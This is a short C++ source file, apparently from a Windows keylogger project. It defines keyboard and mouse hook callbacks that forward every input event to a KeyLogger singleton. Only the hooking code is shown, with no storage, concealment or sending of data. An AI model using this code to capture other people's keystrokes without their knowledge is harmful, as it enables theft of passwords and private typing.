#include "KeyLoger.hpp"

LRESULT CALLBACK KeyboardProc(int code, WPARAM wParam, LPARAM lParam) {
	if (code < 0)
		return CallNextHookEx(NULL, code, wParam, lParam);

	KeyLogger::getInstance().onKeyboardEvent(code, wParam, lParam);

	return CallNextHookEx(KeyLogger::getInstance().m_hook, code, wParam, lParam);
}

LRESULT MouseHookFunction(int code, WPARAM wParam, LPARAM lParam) {
	KeyLogger::getInstance().onMouseEvent(code, wParam, lParam);
	return CallNextHookEx(KeyLogger::getInstance().m_hook_mouse, code, wParam, lParam);
}

LRESULT CALLBACK MouseProc(int code, WPARAM wParam, LPARAM lParam) {
	if (code < 0)
		return CallNextHookEx(NULL, code, wParam, lParam);

	if (code == HC_ACTION /*&& m_mousecode2name.find(wParam) != m_mousecode2name.end()*/)
	{
		return MouseHookFunction(code, wParam, lParam);
	}
	return CallNextHookEx(KeyLogger::getInstance().m_hook_mouse, code, wParam, lParam);
}